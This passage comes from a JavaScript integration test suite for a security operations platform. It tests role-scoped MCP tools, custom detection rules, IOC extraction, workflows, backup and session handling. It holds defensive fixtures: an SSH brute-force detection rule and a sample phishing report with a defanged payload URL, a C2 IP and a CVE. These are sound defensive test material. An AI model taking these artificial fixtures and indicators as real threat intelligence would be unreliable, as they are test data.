    ok((await rpc(mcpRead, { jsonrpc: '2.0', method: 'notifications/initialized' })).status === 202, 'notification gets 202');
    r = await rpc(mcpRead, { jsonrpc: '2.0', id: 2, method: 'tools/list' });
    const readTools = r.json.result.tools.map((t) => t.name);
    ok(readTools.includes('list_alerts') && !readTools.includes('block_ip'), 'read-only key sees read tools only');
    r = await rpc(mcpWrite, { jsonrpc: '2.0', id: 3, method: 'tools/list' });
    ok(r.json.result.tools.some((t) => t.name === 'block_ip' && t.inputSchema.required.includes('target_ip')), 'write key sees response tools');
    r = await rpc(mcpRead, { jsonrpc: '2.0', id: 4, method: 'tools/call', params: { name: 'get_alert', arguments: { alert_id: alertId } } });
    ok(!r.json.result.isError && JSON.parse(r.json.result.content[0].text).alert.alert_id === alertId, 'tools/call returns real data');
    r = await rpc(mcpRead, { jsonrpc: '2.0', id: 5, method: 'tools/call', params: { name: 'block_ip', arguments: { target_ip: '203.0.113.9', reason: 'test' } } });
    ok(r.json.result.isError === true, 'read key cannot call write tools');
    r = await rpc(mcpWrite, { jsonrpc: '2.0', id: 6, method: 'tools/call', params: { name: 'block_ip', arguments: { target_ip: '203.0.113.9', reason: 'MCP containment test', ttl_hours: 1 } } });
    ok(!r.json.result.isError && JSON.parse(r.json.result.content[0].text).rule.target_ip === '203.0.113.9', 'MCP block executes under auto policy');
    r = await rpc(mcpWrite, [{ jsonrpc: '2.0', id: 7, method: 'ping' }, { jsonrpc: '2.0', id: 8, method: 'nope' }]);
    ok(Array.isArray(r.json) && r.json[1].error.code === -32601, 'batch with unknown method');
    ok((await call('GET', '/mcp', { as: null })).status === 405, 'GET /mcp is 405 (stateless)');
    ok((await call('GET', '/api/audit?limit=200')).json.some((a) => a.action === 'mcp.call' && a.actor === 'mcp:soc-agent'), 'MCP calls are audited');

    // ---- Workbench: detections, documents, workflows, decisions, backup ----------
    r = await call('GET', '/api/workbench/status');
    ok(r.status === 200 && r.json.assistant === false && r.json.jira === false && r.json.pending_migration == null, 'workbench status reports integrations honestly');
    await call('POST', '/api/users', { body: { name: 'Vic Viewer', email: 'vic@corp.example', password: 'Another1pass', role: 'viewer' } });
    ok((await call('POST', '/api/auth/login', { as: 'vic', body: { email: 'vic@corp.example', password: 'Another1pass' } })).status === 200, 'second viewer signs in');

    const SSH_RULE = 'title: Root login refused over SSH\ndescription: Password guessing against root\nlevel: high\ntags: [attack.t1110.001]\nfalsepositives: [admins]\nlogsource:\n  product: linux\n  service: sshd\ndetection:\n  keywords:\n    - \'Failed password for root\'\n  condition: keywords\n';
    r = await call('POST', '/api/detections/custom/lint', { body: { yaml: 'title: broken\n  x: [' } });
    ok(r.status === 200 && r.json.ok === false && /line/.test(r.json.errors[0]), 'lint points at the YAML error');
    ok((await call('POST', '/api/detections/custom', { body: { yaml: 'title: nope' } })).status === 400, 'a rule that does not lint is not saved');
    r = await call('POST', '/api/detections/custom', { body: { yaml: SSH_RULE } });
    ok(r.status === 201 && r.json.technique === 'T1110.001' && r.json.enabled === true, 'custom rule saved with its technique');
    const ruleId = r.json.rule_id;
    ok((await call('POST', '/api/detections/custom', { as: 'vic', body: { yaml: SSH_RULE } })).status === 403, 'viewer cannot write detections');
    r = await call('POST', '/api/detections/custom/test', { body: { rule_id: ruleId, lines: 'Oct 17 10:00:01 web sshd[11]: Failed password for root from 203.0.113.9 port 2222 ssh2\nOct 17 10:00:02 web sshd[11]: Accepted publickey for deploy from 10.0.0.2 port 50000 ssh2' } });
    ok(r.status === 200 && r.json.parsed === 2 && r.json.hits === 1 && /203\.0\.113\.9/.test(r.json.matches[0].line), 'rule test matches the right pasted line only');
    r = await call('PUT', `/api/detections/custom/${ruleId}`, { body: { enabled: false } });
    ok(r.status === 200 && r.json.enabled === false, 'rule can be switched off');
    ok((await call('DELETE', `/api/detections/custom/${ruleId}`)).status === 200 && (await call('GET', `/api/detections/custom/${ruleId}`)).status === 404, 'rule deleted');

    const report = 'Phishing wave. Payload from hxxps://cdn-update[.]top/inv.exe sha256 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08, C2 185.220.101[.]45, internal relay 10.0.4.22. Exploits CVE-2021-44228 (T1190).';
    r = await call('POST', '/api/documents/analyze', { body: { text: report } });
    ok(r.status === 200 && r.json.iocs.some((i) => i.value === '185.220.101.45') && r.json.iocs.some((i) => i.value === '10.0.4.22' && i.internal) && r.json.refs.cves.includes('CVE-2021-44228'), 'document analysis extracts defanged IOCs, internal flags and CVEs');
    ok((await call('POST', '/api/documents', { body: { name: 'a.bin', content: 'MZ\u0000\u0000' } })).status === 415, 'binary uploads refused');
    r = await call('POST', '/api/documents', { body: { name: 'phish-report.txt', mime: 'text/plain', content: report } });
    ok(r.status === 201 && r.json.sha256 === crypto.createHash('sha256').update(report).digest('hex') && r.json.duplicate_of === null, 'document stored with its SHA-256');
    const docId = r.json.doc_id;
    ok((await call('POST', '/api/documents', { body: { name: 'again.txt', content: report } })).json.duplicate_of === docId, 'duplicate upload is recognised');
    r = await call('POST', '/api/cases', { body: { title: 'Phishing wave with Log4Shell follow-up', severity: 'HIGH' } });
    const docCase = r.json.case_id;
    r = await call('POST', `/api/documents/${docId}/attach`, { body: { case_id: docCase } });
    ok(r.status === 200 && r.json.attached.added >= 2 && !(await call('GET', `/api/cases/${docCase}`)).json.iocs.some((i) => i.value === '10.0.4.22'), 'attaching a document adds external IOCs only');
    ok((await call('DELETE', `/api/documents/${docId}`, { as: 'vic' })).status === 403, 'viewer cannot delete documents');

    r = await call('GET', '/api/workflows/catalog');
    ok(r.status === 200 && r.json.templates.length >= 3 && r.json.steps.hunt, 'workflow catalog');
    ok((await call('POST', '/api/workflows', { body: { name: 'Broken', steps: [{ id: 'a', type: 'hunt', params: { ip: '{{steps.b.ip}}' } }] } })).status === 400, 'workflow with a forward reference refused');
    r = await call('POST', '/api/workflows', { body: { name: 'Sweep and tell', inputs: [{ key: 'ip', label: 'IP', required: true }], steps: [
      { id: 'sweep', type: 'hunt', params: { ip: '{{input.ip}}', window_hours: 72 } },
      { id: 'case', type: 'create_case', params: { title: 'Sweep hit {{input.ip}}', severity: 'MEDIUM' }, when: { path: 'steps.sweep.hits', op: 'gte', value: 1 } },
      { id: 'never', type: 'notify', params: { message: 'no hits' }, when: { path: 'steps.sweep.hits', op: 'eq', value: -1 } }
    ] } });
    ok(r.status === 201, 'workflow saved');
    const wfId = r.json.workflow_id;
    ok((await call('POST', `/api/workflows/${wfId}/run`, { body: { input: {} } })).status === 400, 'required workflow input enforced');
    r = await call('POST', `/api/workflows/${wfId}/run`, { body: { input: { ip: '185.220.101.0/24' } } });
    ok(r.status === 200 && r.json.status === 'SUCCEEDED' && r.json.steps[0].status === 'ok' && r.json.steps[1].status === 'ok' && r.json.steps[2].status === 'skipped', 'workflow runs real steps and honours conditions');
    ok((await call('GET', `/api/workflows/runs/${r.json.run_id}`)).json.steps.length === 3, 'run history kept');
    ok((await call('GET', `/api/workflows/${wfId}`)).json.runs === 1, 'workflow run counter');
    ok((await call('POST', `/api/workflows/${wfId}/run`, { as: 'vic', body: { input: { ip: '1.1.1.1' } } })).status === 403, 'viewer cannot run workflows');
    r = await call('POST', '/api/workflows', { body: { template: 'ioc-triage' } });
    ok(r.status === 201 && r.json.steps.length === 5, 'workflow created from a template');

    r = await call('GET', '/api/decisions?days=30');
    ok(r.status === 200 && r.json.rows.some((x) => x.investigation_id === invId), 'decisions log lists investigations');
    ok((await call('POST', `/api/decisions/${invId}/feedback`, { body: { correct: 'yes' } })).status === 400, 'feedback needs a boolean verdict');
    ok((await call('POST', `/api/decisions/${invId}/feedback`, { body: { correct: true, rating: 9 } })).status === 400, 'rating is 1-5');
    r = await call('POST', `/api/decisions/${invId}/feedback`, { body: { correct: true, rating: 4, notes: 'Evidence chain was right' } });
    ok(r.status === 200, 'analyst judges a decision');
    r = await call('GET', '/api/decisions?days=30&judged=yes');
    ok(r.json.totals.judged >= 1 && r.json.rows.every((x) => x.correct !== null) && r.json.rows.find((x) => x.investigation_id === invId).rating === 4, 'accuracy built from analyst feedback');

    ok((await call('POST', `/api/cases/${docCase}/jira`)).status === 400 || (await call('POST', `/api/cases/${docCase}/jira`)).status === 503, 'Jira refuses cleanly when not configured');
    ok((await call('POST', '/api/notify/channels', { body: { name: 'On-call', kind: 'pagerduty', secret: 'short' } })).status === 400, 'PagerDuty key validated');
    r = await call('POST', '/api/notify/channels', { body: { name: 'On-call', kind: 'pagerduty', secret: 'a'.repeat(32), min_severity: 'CRITICAL' } });
    ok(r.status === 201 && r.json.kind === 'pagerduty' && /events\.pagerduty\.com/.test(r.json.url_hint) && r.json.signed === true, 'PagerDuty channel pinned to the Events API');

    ok((await call('GET', '/api/admin/backup', { as: 'vic' })).status === 403, 'viewer cannot export a backup');
    r = await call('GET', '/api/admin/backup');
    ok(r.status === 200 && r.json.format === 'aegis-backup' && r.json.tables.workflows.length === 2 && !r.json.users.some((u) => u.password_hash) && r.json.config.notifyChannels === undefined, 'backup exports data without credentials');
    const snap = r.json;
    await call('DELETE', `/api/workflows/${wfId}`);
    ok((await call('GET', `/api/workflows/${wfId}`)).status === 404, 'workflow deleted before restore');
    ok((await call('POST', '/api/admin/restore', { body: { format: 'other' } })).status === 400, 'restore refuses foreign files');
    ok((await call('POST', '/api/admin/restore', { body: { format: 'aegis-backup', version: 1, tables: { nope: [] } } })).status === 400, 'restore refuses unknown tables');
    r = await call('POST', '/api/admin/restore', { body: snap });
    ok(r.status === 200 && r.json.restored.workflows === 2 && (await call('GET', `/api/workflows/${wfId}`)).status === 200, 'restore brings the workflow back');
    store.pendingExtras = { migration: '20261019000000_assistant_workflows_documents.sql', error: 'relation "workflows" does not exist' };
    ok((await call('GET', '/api/workflows')).status === 503 && (await call('GET', '/api/alerts?limit=1')).status === 200, 'missing workbench migration answers 503 without breaking the rest');
    store.pendingExtras = null;

    // A database without the casework migration: those routes answer 503, the rest keeps working.
    store.pending = { migration: '20261018000000_cases_approvals_hunts.sql', error: 'relation "cases" does not exist' };
    r = await call('GET', '/api/cases');
    ok(r.status === 503 && /20261018000000/.test(r.json.error), 'missing casework migration answers 503');
    ok((await call('GET', '/api/alerts?limit=1')).status === 200, 'core API unaffected by missing migration');
    ok((await call('GET', '/api/health')).json.pending_migration === '20261018000000_cases_approvals_hunts.sql', 'health reports the pending migration');
    store.pending = null;
    // Password change revokes the old cookie.
    const oldCookie = jar.admin;
    r = await call('POST', '/api/auth/password', { body: { current_password: 'Str0ngPassword', new_password: 'Newer1Password' } });
    ok(r.status === 200, 'password changed');
    const stale = await fetch(`${base}/api/alerts`, { headers: { Cookie: oldCookie } });
    ok(stale.status === 401, 'old session invalid after password change');

    const audit = (await call('GET', '/api/audit?limit=200')).json.map((a) => a.action);
    ok(['user.created', 'key.created', 'ingest.alerts', 'feed.pulled', 'auth.failed'].every((x) => audit.includes(x)), 'audit trail records security events');

    r = await jobs.retention();
    ok(r.alerts === 0 && r.logs === 0, 'retention job runs');
    console.log(`\n${passed} HTTP checks passed`);
  } finally {
    server.close();
    hook.close();
    jobs.stop();
    await wipe();
  }
  process.exit(0);
})().catch((e) => { console.error(e); process.exit(1); });